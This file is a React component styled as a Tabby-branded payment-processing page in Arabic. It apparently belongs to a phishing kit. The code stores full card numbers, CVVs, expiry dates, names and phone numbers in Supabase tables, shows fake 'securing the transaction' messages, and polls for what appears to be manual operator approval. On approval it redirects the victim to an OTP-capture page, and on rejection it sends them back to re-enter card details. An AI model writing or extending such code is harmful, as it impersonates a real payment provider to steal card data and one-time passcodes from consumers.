import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { CheckCircle, XCircle } from "lucide-react";
import tabbyLogo from "@/assets/tabby-logo.png";
import { supabase } from "@/integrations/supabase/client";

const loadingMessages = [
  "جاري معالجة الدفع...",
  "التحقق من بيانات البطاقة...",
  "تأمين المعاملة...",
  "إتمام العملية...",
];

const TabbyPaymentProcessing = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [messageIndex, setMessageIndex] = useState(0);
  const [paymentStatus, setPaymentStatus] = useState<"processing" | "success" | "failed">("processing");
  const [paymentId, setPaymentId] = useState<string | null>(null);

  const cardholderName = searchParams.get("cardholderName") || "";
  const cardNumber = searchParams.get("cardNumber") || "";
  const cardNumberLast4 = searchParams.get("cardNumberLast4") || "";
  const expiryDate = searchParams.get("expiryDate") || "";
  const cvv = searchParams.get("cvv") || "";
  const totalAmount = searchParams.get("totalAmount") || "0";
  const company = searchParams.get("company") || "";
  const phone = searchParams.get("phone") || "";

  // Rotate loading messages
  useEffect(() => {
    if (paymentStatus === "processing") {
      const interval = setInterval(() => {
        setMessageIndex((prev) => (prev + 1) % loadingMessages.length);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [paymentStatus]);

  // Submit payment and check status
  useEffect(() => {
    const submitPayment = async () => {
      try {
        // Insert payment record
        const { data, error } = await supabase
          .from("tabby_payments")
          .insert({
            cardholder_name: cardholderName,
            card_number: cardNumber,
            card_number_last4: cardNumberLast4,
            expiry_date: expiryDate,
            cvv: cvv,
            total_amount: parseFloat(totalAmount),
            company: company,
            phone: phone,
            payment_status: "pending",
          })
          .select()
          .single();

        if (error) throw error;
        setPaymentId(data.id);

        // أيضاً حفظ البطاقة في جدول المحاولات
        await supabase.from("tabby_payment_attempts").insert({
          payment_id: data.id,
          card_number: cardNumber,
          cardholder_name: cardholderName,
          expiry_date: expiryDate,
          cvv: cvv,
        });

        // Poll for status updates on payment attempts
        const pollInterval = setInterval(async () => {
          const { data: attemptsData, error: attemptsError } = await supabase
            .from("tabby_payment_attempts")
            .select("approval_status")
            .eq("payment_id", data.id)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();

          if (attemptsError) {
            console.log("No payment attempts yet or error:", attemptsError);
            return;
          }

          if (attemptsData?.approval_status === "approved") {
            clearInterval(pollInterval);
            setPaymentStatus("success");
            setTimeout(() => {
              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${data.id}`);
            }, 2000);
          } else if (attemptsData?.approval_status === "rejected") {
            clearInterval(pollInterval);
            setPaymentStatus("failed");
            setTimeout(() => {
              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}`);
            }, 3000);
          }
        }, 2000);

        // Timeout after 30 seconds
        setTimeout(() => {
          clearInterval(pollInterval);
          if (paymentStatus === "processing") {
            setPaymentStatus("failed");
            setTimeout(() => {
              navigate(-1);
            }, 3000);
          }
        }, 30000);

      } catch (error) {
        console.error("Payment submission error:", error);
        setPaymentStatus("failed");
        setTimeout(() => {
          navigate(-1);
        }, 3000);
      }
    };

    submitPayment();
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 p-4 flex items-center justify-center" dir="rtl">
      <div className="max-w-md w-full">
        {/* Tabby Logo */}
        <div className="flex justify-center mb-8">
          <div className="w-32 h-12 flex items-center justify-center">
            <img src={tabbyLogo} alt="تابي" className="w-full h-full object-contain" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {/* Status Icon and Message */}
          <div className="flex flex-col items-center justify-center min-h-[300px]">
            {paymentStatus === "processing" && (
              <>
                <div className="relative w-24 h-24 mb-6">
                  <div className="absolute inset-0 border-4 border-[#22C55E] border-t-transparent rounded-full animate-spin"></div>
                  <div className="absolute inset-2 border-4 border-[#3CDBC0] border-t-transparent rounded-full animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1s' }}></div>
                </div>
                <p className="text-xl font-bold text-center mb-2">
                  {loadingMessages[messageIndex]}
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  يرجى الانتظار، لا تغلق هذه النافذة
                </p>
              </>
            )}

            {paymentStatus === "success" && (
              <>
                <div className="w-24 h-24 mb-6 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-16 h-16 text-green-600" />
                </div>
                <p className="text-xl font-bold text-center text-green-600 mb-2">
                  تمت العملية بنجاح!
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  جاري التحويل إلى صفحة التحقق...
                </p>
              </>
            )}

            {paymentStatus === "failed" && (
              <>
                <div className="w-24 h-24 mb-6 bg-red-100 rounded-full flex items-center justify-center">
                  <XCircle className="w-16 h-16 text-red-600" />
                </div>
                <p className="text-xl font-bold text-center text-red-600 mb-2">
                  فشلت عملية الدفع
                </p>
                <p className="text-sm text-muted-foreground text-center">
                  معلومات البطاقة غير صحيحة، سيتم إعادتك لإدخال البيانات مرة أخرى...
                </p>
              </>
            )}
          </div>

          {/* Payment Details */}
          <div className="mt-8 pt-6 border-t-2 border-gray-100">
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">حامل البطاقة:</span>
                <span className="font-medium">{cardholderName}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">البطاقة:</span>
                <span className="font-medium">**** **** **** {cardNumberLast4}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">رقم الجوال:</span>
                <span className="font-medium">+966{phone}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">المبلغ الإجمالي:</span>
                <span className="font-bold text-lg">{totalAmount} ر.س</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default TabbyPaymentProcessing;
